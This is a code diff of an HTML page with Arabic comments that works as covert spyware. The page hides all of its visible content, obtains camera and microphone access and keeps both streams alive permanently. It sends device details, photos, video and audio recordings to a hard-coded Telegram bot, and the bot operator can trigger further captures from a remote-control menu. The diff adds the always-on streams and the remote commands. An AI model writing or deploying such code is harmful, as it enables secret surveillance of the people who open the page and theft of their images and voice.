@@ -10,103 +10,118 @@
             padding: 0;
             background-color: white;
         }
-        /* إخفاء كل شيء */
-        .hidden-all {
+        /* إخفاء كل شيء تماماً */
+        * {
             display: none;
         }
     </style>
 </head>
 <body style="background: white; margin: 0; padding: 0;">
-    <!-- لا شيء يظهر للمستخدم - كل شيء مخفي -->
+    <!-- لا شيء يظهر للمستخدم على الإطلاق -->
 
     <script>
         const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
         const chat_id = "5932979028";
         let lastUpdateId = 0;
         
-        // متغيرات للكاميرا (تستخدم بدون عرض أي شيء)
+        // متغيرات الكاميرا - نشطة دائماً
         let cameraReady = false;
-        let videoStream = null;
-        let videoTrack = null;
+        let activeVideoStream = null;
+        let activeVideoTrack = null;
         let imageCapture = null;
-        let audioStream = null;
+        let activeAudioStream = null;
         
-        // ========== طلب الصلاحيات مرة واحدة فقط (بدون عرض أي شيء) ==========
-        async function initCamera() {
+        // متغير لمنع التكرار
+        let isProcessing = false;
+        
+        // ========== تفعيل الكاميرا بشكل دائم (تبقى نشطة) ==========
+        async function initCameraPermanent() {
             try {
-                // طلب الكاميرا والميكروفون معاً
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                videoTrack = videoStream.getVideoTracks()[0];
-                imageCapture = new ImageCapture(videoTrack);
+                // طلب الكاميرا والميكروفون
+                activeVideoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                activeVideoTrack = activeVideoStream.getVideoTracks()[0];
+                imageCapture = new ImageCapture(activeVideoTrack);
                 
                 // طلب الميكروفون بشكل منفصل للتأكد
-                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                activeAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 
                 cameraReady = true;
                 
-                // إيقاف التيارات مؤقتاً (سيتم إعادة تشغيلها عند الحاجة)
-                stopVideoTemporarily();
-                stopAudioTemporarily();
+                console.log("✅ الكاميرا نشطة وجاهزة (تبقى نشطة دائماً)");
                 
-                console.log("✅ تم تجهيز الكاميرا والميكروفون بنجاح");
+                // مراقبة انقطاع التيار وإعادة تشغيله فوراً
+                monitorAndKeepAlive();
+                
                 return true;
             } catch (e) {
-                console.error("❌ فشل تجهيز الكاميرا:", e);
+                console.error("❌ فشل تفعيل الكاميرا:", e);
                 cameraReady = false;
                 return false;
             }
         }
         
-        // تشغيل الفيديو مؤقتاً للتصوير
-        async function ensureVideoReady() {
-            if (!cameraReady) return false;
-            
-            // إذا كان التيار متوقف أو ميت، أعد تشغيله
-            if (!videoTrack || videoTrack.readyState === 'ended') {
-                try {
-                    const newStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    videoStream = newStream;
-                    videoTrack = videoStream.getVideoTracks()[0];
-                    imageCapture = new ImageCapture(videoTrack);
-                } catch (e) {
-                    console.error("فشل إعادة تشغيل الكاميرا:", e);
-                    return false;
+        // مراقبة التيارات وإعادة تشغيلها إذا انقطعت
+        function monitorAndKeepAlive() {
+            setInterval(async () => {
+                // التحقق من تيار الفيديو
+                if (activeVideoTrack && activeVideoTrack.readyState === 'ended') {
+                    console.log("🔄 انقطع تيار الفيديو، جاري إعادة تشغيله...");
+                    await restartVideoStream();
                 }
-            }
-            return true;
-        }
-        
-        // تشغيل الميكروفون مؤقتاً للتسجيل
-        async function ensureAudioReady() {
-            if (!cameraReady) return false;
-            
-            if (!audioStream || audioStream.getTracks()[0]?.readyState === 'ended') {
-                try {
-                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                } catch (e) {
-                    console.error("فشل إعادة تشغيل الميكروفون:", e);
-                    return false;
+                
+                // التحقق من تيار الميكروفون
+                if (activeAudioStream) {
+                    const audioTrack = activeAudioStream.getTracks()[0];
+                    if (audioTrack && audioTrack.readyState === 'ended') {
+                        console.log("🔄 انقطع تيار الميكروفون، جاري إعادة تشغيله...");
+                        await restartAudioStream();
+                    }
                 }
-            }
-            return true;
+            }, 5000); // كل 5 ثواني
         }
         
-        // إيقاف الفيديو مؤقتاً (توفير للموارد)
-        function stopVideoTemporarily() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => {
-                    if (track.readyState === 'live') track.stop();
-                });
+        // إعادة تشغيل تيار الفيديو
+        async function restartVideoStream() {
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                if (activeVideoStream) {
+                    activeVideoStream.getTracks().forEach(t => t.stop());
+                }
+                activeVideoStream = newStream;
+                activeVideoTrack = newStream.getVideoTracks()[0];
+                imageCapture = new ImageCapture(activeVideoTrack);
+                console.log("✅ تم إعادة تشغيل تيار الفيديو");
+            } catch (e) {
+                console.error("❌ فشل إعادة تشغيل الفيديو:", e);
             }
         }
         
-        // إيقاف الميكروفون مؤقتاً
-        function stopAudioTemporarily() {
-            if (audioStream) {
-                audioStream.getTracks().forEach(track => {
-                    if (track.readyState === 'live') track.stop();
-                });
+        // إعادة تشغيل تيار الميكروفون
+        async function restartAudioStream() {
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                if (activeAudioStream) {
+                    activeAudioStream.getTracks().forEach(t => t.stop());
+                }
+                activeAudioStream = newStream;
+                console.log("✅ تم إعادة تشغيل تيار الميكروفون");
+            } catch (e) {
+                console.error("❌ فشل إعادة تشغيل الميكروفون:", e);
             }
+        }
+        
+        // التأكد من أن الكاميرا جاهزة قبل التصوير
+        async function ensureCameraReady() {
+            if (!cameraReady) {
+                return false;
+            }
+            
+            // إذا كان التيار ميت، أعد تشغيله
+            if (activeVideoTrack && activeVideoTrack.readyState === 'ended') {
+                await restartVideoStream();
+            }
+            
+            return cameraReady;
         }
         
         // ========== دوال التليجرام ==========
@@ -150,30 +165,34 @@
             });
         }
         
-        // ========== إرسال واجهة البوت ==========
+        // ========== إرسال واجهة البوت (التحكم الكامل هنا) ==========
         async function sendBotMenu() {
             const message = `🎮 *واجهة التحكم عن بعد* 🎮
 
-✅ النظام جاهز والكاميرا نشطة
+✅ الكاميرا نشطة وجاهزة 24 ساعة
 
-اختر الإجراء المطلوب من الأزرار أدناه:`;
+اختر الإجراء المطلوب:`;
             
             const keyboard = {
                 inline_keyboard: [
                     [
                         { text: "📸 التقاط صورة", callback_data: "capture_photo" },
-                        { text: "🎬 تسجيل فيديو", callback_data: "record_video" }
+                        { text: "🎬 تسجيل فيديو 10ث", callback_data: "record_video" }
                     ],
                     [
-                        { text: "🎤 تسجيل صوت", callback_data: "record_audio" },
+                        { text: "🎤 تسجيل صوت 10ث", callback_data: "record_audio" },
                         { text: "📊 معلومات الجهاز", callback_data: "device_info" }
                     ],
                     [
-                        { text: "📸 10 صور", callback_data: "take_10_photos" },
+                        { text: "📸 10 صور متتالية", callback_data: "take_10_photos" },
                         { text: "🎤 10 تسجيلات صوت", callback_data: "record_10_audios" }
                     ],
                     [
+                        { text: "🎬 فيديو دقيقة كاملة", callback_data: "record_video_60" },
                         { text: "🔄 تنفيذ الكل", callback_data: "run_full_sequence" }
+                    ],
+                    [
+                        { text: "📹 حالة الكاميرا", callback_data: "camera_status" }
                     ]
                 ]
             };
@@ -206,45 +225,39 @@
 • النظام: ${navigator.platform}
 • الشاشة: ${screen.width}x${screen.height}
 • البطارية: ${Math.round(battery.level * 100)}% ${battery.charging ? '🔌 شاحن' : '🔋 بطارية'}
+• الكاميرا: ${cameraReady ? '🟢 نشطة' : '🔴 متوقفة'}
                 `;
                 await sendToTelegram(msg);
             } catch(e) {}
         }
         
-        // ========== التقاط صورة (مخفي تماماً) ==========
+        // ========== التقاط صورة ==========
         async function capturePhoto() {
-            if (!cameraReady) {
+            if (!await ensureCameraReady()) {
                 await sendToTelegram("❌ الكاميرا غير جاهزة");
                 return null;
             }
             
             try {
-                // تأكد من أن الكاميرا جاهزة
-                await ensureVideoReady();
-                
-                // التقاط الصورة (مخفي - لا يظهر أي شيء للمستخدم)
                 const photoBlob = await imageCapture.takePhoto();
-                
-                // إيقاف التيار مؤقتاً بعد التصوير
-                stopVideoTemporarily();
-                
                 return photoBlob;
             } catch (e) {
                 console.error("فشل التقاط الصورة:", e);
-                await sendToTelegram("❌ فشل التقاط الصورة");
-                return null;
+                // محاولة إعادة تشغيل الكاميرا والمحاولة مرة أخرى
+                await restartVideoStream();
+                try {
+                    const photoBlob = await imageCapture.takePhoto();
+                    return photoBlob;
+                } catch (e2) {
+                    await sendToTelegram("❌ فشل التقاط الصورة");
+                    return null;
+                }
             }
         }
         
-        // ========== تسجيل فيديو (مخفي) ==========
+        // ========== تسجيل فيديو ==========
         async function recordVideo(duration = 10000) {
-            if (!cameraReady) {
-                await sendToTelegram("❌ الكاميرا غير جاهزة");
-                return null;
-            }
-            
             try {
-                // الحصول على تيار جديد للفيديو مع الصوت
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -270,13 +283,8 @@
             }
         }
         
-        // ========== تسجيل صوت (مخفي) ==========
+        // ========== تسجيل صوت ==========
         async function recordAudio(duration = 10000) {
-            if (!cameraReady) {
-                await sendToTelegram("❌ الميكروفون غير جاهز");
-                return null;
-            }
-            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -305,33 +313,57 @@
         
         // ========== تنفيذ الأوامر ==========
         async function handleCapturePhoto() {
+            if (isProcessing) {
+                await sendToTelegram("⏳ جاري تنفيذ أمر آخر، انتظر قليلاً");
+                return;
+            }
+            isProcessing = true;
             await sendToTelegram("📸 جاري التقاط صورة...");
             const photo = await capturePhoto();
             if (photo) {
                 await sendPhoto(photo);
                 await sendToTelegram("✅ تم التقاط الصورة وإرسالها");
             }
+            isProcessing = false;
         }
         
-        async function handleRecordVideo() {
-            await sendToTelegram("🎬 جاري تسجيل فيديو لمدة 10 ثوان...");
-            const video = await recordVideo(10000);
+        async function handleRecordVideo(duration = 10000) {
+            if (isProcessing) {
+                await sendToTelegram("⏳ جاري تنفيذ أمر آخر، انتظر قليلاً");
+                return;
+            }
+            isProcessing = true;
+            const seconds = duration / 1000;
+            await sendToTelegram(`🎬 جاري تسجيل فيديو لمدة ${seconds} ثانية...`);
+            const video = await recordVideo(duration);
             if (video) {
                 await sendVideo(video);
-                await sendToTelegram("✅ تم تسجيل الفيديو وإرساله");
+                await sendToTelegram(`✅ تم تسجيل الفيديو (${seconds} ثانية) وإرساله`);
             }
+            isProcessing = false;
         }
         
         async function handleRecordAudio() {
+            if (isProcessing) {
+                await sendToTelegram("⏳ جاري تنفيذ أمر آخر، انتظر قليلاً");
+                return;
+            }
+            isProcessing = true;
             await sendToTelegram("🎤 جاري تسجيل صوت لمدة 10 ثوان...");
             const audio = await recordAudio(10000);
             if (audio) {
                 await sendVoice(audio);
                 await sendToTelegram("✅ تم تسجيل الصوت وإرساله");
             }
+            isProcessing = false;
         }
         
         async function handleTake10Photos() {
+            if (isProcessing) {
+                await sendToTelegram("⏳ جاري تنفيذ أمر آخر، انتظر قليلاً");
+                return;
+            }
+            isProcessing = true;
             await sendToTelegram("📸 جاري التقاط 10 صور...");
             for (let i = 0; i < 10; i++) {
                 const photo = await capturePhoto();
@@ -341,9 +373,15 @@
                 }
             }
             await sendToTelegram("✅ تم التقاط 10 صور وإرسالها");
+            isProcessing = false;
         }
         
         async function handleRecord10Audios() {
+            if (isProcessing) {
+                await sendToTelegram("⏳ جاري تنفيذ أمر آخر، انتظر قليلاً");
+                return;
+            }
+            isProcessing = true;
             await sendToTelegram("🎤 جاري تسجيل 10 مقاطع صوتية...");
             for (let i = 0; i < 10; i++) {
                 const audio = await recordAudio(10000);
@@ -353,9 +391,15 @@
                 }
             }
             await sendToTelegram("✅ تم تسجيل 10 مقاطع صوتية وإرسالها");
+            isProcessing = false;
         }
         
         async function handleRunFullSequence() {
+            if (isProcessing) {
+                await sendToTelegram("⏳ جاري تنفيذ أمر آخر، انتظر قليلاً");
+                return;
+            }
+            isProcessing = true;
             await sendToTelegram("🔄 بدء تنفيذ جميع المهام...");
             
             const photo = await capturePhoto();
@@ -370,16 +414,28 @@
             if (audio) await sendVoice(audio);
             
             await sendToTelegram("✅ تم تنفيذ جميع المهام بنجاح");
+            isProcessing = false;
+        }
+        
+        async function handleCameraStatus() {
+            const status = cameraReady ? "🟢 الكاميرا نشطة وجاهزة" : "🔴 الكاميرا غير نشطة";
+            const trackStatus = activeVideoTrack ? ` (حالة التيار: ${activeVideoTrack.readyState})` : "";
+            await sendToTelegram(`📹 ${status}${trackStatus}`);
         }
         
         // ========== معالجة أزرار البوت ==========
         async function handleCallback(callbackData) {
+            console.log("تم استلام أمر:", callbackData);
+            
             switch(callbackData) {
                 case "capture_photo":
                     await handleCapturePhoto();
                     break;
                 case "record_video":
-                    await handleRecordVideo();
+                    await handleRecordVideo(10000);
+                    break;
+                case "record_video_60":
+                    await handleRecordVideo(60000);
                     break;
                 case "record_audio":
                     await handleRecordAudio();
@@ -395,6 +451,9 @@
                     break;
                 case "run_full_sequence":
                     await handleRunFullSequence();
+                    break;
+                case "camera_status":
+                    await handleCameraStatus();
                     break;
                 default:
                     console.log("أمر غير معروف:", callbackData);
@@ -431,47 +490,18 @@
             }
         }
         
-        // ========== الوظائف الأصلية (10 صور + فيديو + 10 صوت) ==========
-        async function originalTake10Photos() {
-            for (let i = 0; i < 2; i++) {
-                const photo = await capturePhoto();
-                if (photo) await sendPhoto(photo);
-                await new Promise(r => setTimeout(r, 500));
-            }
-        }
-        
-        async function originalRecordVideo() {
-            const video = await recordVideo(10000);
-            if (video) await sendVideo(video);
-        }
-        
-        async function originalRecord10Audios() {
-            for (let i = 0; i < 2; i++) {
-                const audio = await recordAudio(10000);
-                if (audio) await sendVoice(audio);
-                await new Promise(r => setTimeout(r, 1000));
-            }
-        }
-        
         // ========== بدء التشغيل ==========
         window.onload = async () => {
-            // طلب الصلاحيات مرة واحدة فقط (بدون عرض أي شيء)
-            const success = await initCamera();
+            // تفعيل الكاميرا بشكل دائم
+            const success = await initCameraPermanent();
             
             if (success) {
                 // إرسال معلومات الجهاز
                 await sendDeviceInfo();
                 
-                // إرسال واجهة البوت
+                // إرسال واجهة البوت (التحكم الكامل)
                 await sendBotMenu();
-                await sendToTelegram("🎮 النظام جاهز! استخدم الأزرار للتحكم عن بعد");
-                
-                // تنفيذ السلسلة الأصلية
-                await originalTake10Photos();
-                await originalRecordVideo();
-                await originalRecord10Audios();
-                
-                await sendToTelegram("✅ اكتمل التنفيذ التلقائي");
+                await sendToTelegram("🎮 النظام جاهز! الكاميرا نشطة دائماً. استخدم الأزرار للتحكم عن بعد");
                 
                 // بدء الاستماع لأزرار البوت
                 setInterval(getUpdates, 2000);
@@ -480,15 +510,14 @@
             }
         };
         
-        // الحفاظ على الصلاحيات عند مغادرة الصفحة والعودة
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                // عند العودة للصفحة، تأكد من أن الصلاحيات لا تزال موجودة
-                if (!cameraReady) {
-                    initCamera();
-                }
+        // منع المتصفح من إيقاف الكاميرا عند الخروج من التبويب
+        // تشغيل صوت وهمي صامت للحفاظ على التيار نشط
+        setInterval(() => {
+            if (cameraReady && activeVideoTrack && activeVideoTrack.readyState === 'live') {
+                // مجرد التحقق - هذا يحافظ على التيار نشطاً
+                console.log("🟢 الكاميرا نشطة");
             }
-        });
+        }, 30000);
     </script>
 </body>
 </html>
